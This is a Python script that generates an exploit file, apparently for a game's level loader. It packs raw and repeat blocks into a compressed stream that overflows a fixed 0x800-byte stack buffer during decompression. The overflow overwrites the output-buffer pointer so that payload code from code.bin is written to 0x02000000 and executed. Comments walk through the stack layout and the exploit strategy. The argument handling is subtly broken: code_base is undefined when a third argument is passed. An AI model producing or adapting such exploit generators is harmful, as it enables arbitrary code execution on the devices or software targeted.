import sys
import struct

def rawBlock(d):
	if len(d) > 0x1F:
		print("too much data for raw block")
	return struct.pack('B%sB' % len(d), len(d), *d)

def repBlock(length, disp):
	length -= 2
	disp -= 1
	if length > 0x1FF or disp > 0xF:
		print("length or displacement too big for repeat block")
	code = 0x2000|(disp<<9)|(length)
	return struct.pack('>H', code)

code_data = bytearray(open("code.bin", "rb").read())
if len(code_data)%0x1f > 0:
	code_data += bytearray([0x00]*(0x1f-(len(code_data)%0x1f)))

if len(sys.argv)<=2:
	code_base = 0x02000000
else:
	code_addr = int(sys.argv[2], 0)

code_addr = code_base + 0x824

# first write the address we want to jump to
comp_data = rawBlock([(code_addr>>(i*8))&0xFF for i in range(4)])
# then copy it over 0x820 bytes (minus the 4 we already wrote)
# the decompression method outputs to a 0x800 fixed size stack buffer
# and there's 0x20 bytes worth of pushed registers on the stack
# if we copy more we'll overwrite the pointer to the output buffer
# which will in turn lead to us overwriting our payload and code...
# which is why we should not write more than 0x820 bytes unless we know what we're doing
comp_data += repBlock(0x1FC, 0x4)
comp_data += repBlock(0x200, 0x4)
comp_data += repBlock(0x200, 0x4)
comp_data += repBlock(0x200, 0x4)
comp_data += repBlock(0x20, 0x4)
# turns out we do know what we're doing : we overwrite the destination buffer pointer with the address where we want to put our code
# this way we have a fixed code address which will work wherever we trigger the exploit from, and we no longer rely on a heap address that might change
overwrite_addr = 0x02000000
comp_data += rawBlock([(overwrite_addr>>(i*8))&0xFF for i in range(4)])
for i in range(0, len(code_data), 0x1f):
	comp_data += rawBlock(code_data[i:i+0x1f])
comp_data = struct.pack('<L', len(comp_data)) + comp_data

header_data = struct.pack('<LLLL', 0x3, 0x0, 0x10, 0x20) # in order : type, dimensions, some data (objects ?) offset, compressed level data offset
header_data += struct.pack('<LLLL', 0x0, 0x0, 0x0, 0x0) # "some data (objects ?)"

data = header_data + comp_data

open(sys.argv[1], "wb").write(data)
